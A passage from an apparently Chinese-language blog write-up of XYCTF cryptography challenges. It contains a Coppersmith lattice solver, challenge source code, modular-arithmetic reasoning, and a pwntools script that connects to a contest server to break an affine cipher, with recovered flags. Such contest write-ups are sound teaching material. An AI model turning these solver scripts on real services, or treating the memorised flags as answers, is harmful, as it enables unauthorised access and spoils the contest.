mathnormal">n</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ChaCha20</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">mh = </span><br><span class="line">C = </span><br><span class="line">enc = <span class="string">b&#x27;\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe&#x27;</span></span><br><span class="line">mh_re, mh_im = mh</span><br><span class="line">PR.&lt;x,y&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">f = (mh_re + x)**<span class="number">3</span> - <span class="number">3</span>*(mh_re + x)*(mh_im + y)**<span class="number">2</span> - C[<span class="number">0</span>]</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">128</span>,<span class="number">2</span>^<span class="number">128</span>), m=<span class="number">2</span>, d=<span class="number">3</span>)</span><br><span class="line">m_re = mh_re + <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">m_im = mh_im + <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">flag = ChaCha20.new(key=hashlib.sha256(<span class="built_in">str</span>(m_re + m_im).encode()).digest(), nonce=<span class="string">b&#x27;Pr3d1ctmyxjj&#x27;</span>).decrypt(enc).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># XYCTF&#123;Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge&#125;</span></span><br></pre></td></tr></table></figure><h2 id="reed"><a class="markdownIt-Anchor" href="#reed"></a> reed</h2><blockquote><p>I’ve invented a new random number generation algorithm, and I believe it’s secure enough to withstand all known attacks!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag.rstrip(<span class="string">&#x27;&#125;&#x27;</span>).lstrip(<span class="string">&#x27;XYCTF&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(i <span class="keyword">in</span> table <span class="keyword">for</span> i <span class="keyword">in</span> flag)</span><br><span class="line">r = random.Random()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PRNG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed</span>):</span><br><span class="line">        self.a = <span class="number">1145140</span></span><br><span class="line">        self.b = <span class="number">19198100</span></span><br><span class="line">        random.seed(seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        x = random.randint(self.a, self.b)</span><br><span class="line">        random.seed(x ** <span class="number">2</span> + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self, k</span>):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">            x = self.<span class="built_in">next</span>()</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, a, b</span>):</span><br><span class="line">    c = [(a * table.index(m) + b) % <span class="number">19198111</span> <span class="keyword">for</span> m <span class="keyword">in</span> msg]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">seed = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;give me seed: &#x27;</span>))</span><br><span class="line">prng = PRNG(seed)</span><br><span class="line">a = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">b = prng.<span class="built_in">round</span>(r.randrange(<span class="number">2</span>**<span class="number">16</span>))</span><br><span class="line">enc = encrypt(flag, a, b)</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><p>怎么说呢，一开始看到<strong>随机数种子</strong>，以为可以搞搞随机数漏洞，发现其实并不是的</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>0</mn></msub><mo>≡</mo><mi>a</mi><mo>∗</mo><msub><mi>m</mi><mn>0</mn></msub><mo>+</mo><mi>b</mi><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">c_{0}\equiv a*m_{0}+b\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mn>1</mn></msub><mo>≡</mo><mi>a</mi><mo>∗</mo><msub><mi>m</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">c_{1}\equiv a*m_{1}+b\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">b</span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo>≡</mo><mo stretchy="false">(</mo><msub><mi>c</mi><mn>0</mn></msub><mo>−</mo><msub><mi>c</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>m</mi><mn>0</mn></msub><mo>−</mo><msub><mi>m</mi><mn>1</mn></msub><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">a\equiv (c_{0}-c_{1})*(m_{0}-m_{1})^{-1}\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>只要</mtext><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><msub><mi>m</mi><mn>0</mn></msub><mo>−</mo><msub><mi>m</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mtext>，逆元即存在</mtext></mrow><annotation encoding="application/x-tex">只要GCD(m_{0}-m_{1},p)=1，逆元即存在</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">要</span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>≡</mo><msub><mi>c</mi><mn>0</mn></msub><mo>−</mo><mi>a</mi><mo>∗</mo><msub><mi>m</mi><mn>0</mn></msub><mi mathvariant="normal">%</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">b\equiv c_{0}-a*m_{0}\%p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.94444em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">%</span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>只需要遍历</mtext><mi>t</mi><mi>a</mi><mi>b</mi><mi>l</mi><msup><mi>e</mi><mn>2</mn></msup><mtext>的空间即可，然后注意</mtext><mi>a</mi><mi>b</mi><mtext>范围，</mtext><mi>s</mi><mi>e</mi><mi>e</mi><mi>d</mi><mtext>随便输</mtext></mrow><annotation encoding="application/x-tex">只需要遍历table^{2}的空间即可，然后注意ab范围，seed随便输</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">遍</span><span class="mord cjk_fallback">历</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">注</span><span class="mord cjk_fallback">意</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">范</span><span class="mord cjk_fallback">围</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">便</span><span class="mord cjk_fallback">输</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;39.106.48.123&quot;</span>, <span class="number">34301</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters + string.digits</span><br><span class="line">p = <span class="number">19198111</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, mod</span>):</span><br><span class="line">    g, x, y = egcd(a, mod)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, <span class="built_in">len</span>(enc)):</span><br><span class="line">            c0 = enc[i]</span><br><span class="line">            c1 = enc[j]</span><br><span class="line">            <span class="keyword">for</span> m0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">                <span class="keyword">for</span> m1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">                    <span class="keyword">if</span> m0 == m1:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    delta_m = m1 - m0</span><br><span class="line">                    delta_c = (c1 - c0) % p</span><br><span class="line">                    inv = modinv(delta_m, p)</span><br><span class="line">                    <span class="keyword">if</span> inv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    a = (delta_c * inv) % p</span><br><span class="line">                    b = (c0 - a * m0) % p</span><br><span class="line">                    <span class="comment"># Check if a and b are within PRNG&#x27;s output range</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= a &lt;= <span class="number">19198100</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">1145140</span> &lt;= b &lt;= <span class="number">19198100</span>):</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    valid = <span class="literal">True</span></span><br><span class="line">                    decrypted = []</span><br><span class="line">                    <span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">                        numerator = (c - b) % p</span><br><span class="line">                        inv_a = modinv(a, p)</span><br><span class="line">                        <span class="keyword">if</span> inv_a <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                            valid = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        m = (numerator * inv_a) % p</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt;= m &lt; <span class="built_in">len</span>(table)):</span><br><span class="line">                            valid = <span class="literal">False</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        decrypted.append(table[m])</span><br><span class="line">                    <span class="keyword">if</span> valid:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(decrypted)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;解密失败&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;give me seed: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">114514</span>))</span><br><span class="line">enc = json.loads(io.recvline().decode())</span><br><span class="line">flag = decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的Flag:&quot;</span>, <span class="string">f&#x27;XYCTF&#123;&#123;<span class="subst">&#123;flag&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># 解密后的Flag: XYCTF&#123;114514fixedpointissodangerous1919810&#125;</span></span><br></pre></td></tr></table></figure><h2 id="choice"><a class="markdownIt-Anchor" href="#choice"></a> choice</h2><blockquote><p>Before we wrap up, here’s one last easy problem.</p></blockquote><p><code>random.py</code>说实话没什么用</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">rand = Random()</span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">f&#x27;enc = <span class="subst">&#123;msg ^ rand.getrandbits(msg.bit_length())&#125;</span>\nr = <span class="subst">&#123;[rand.choice(test) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span 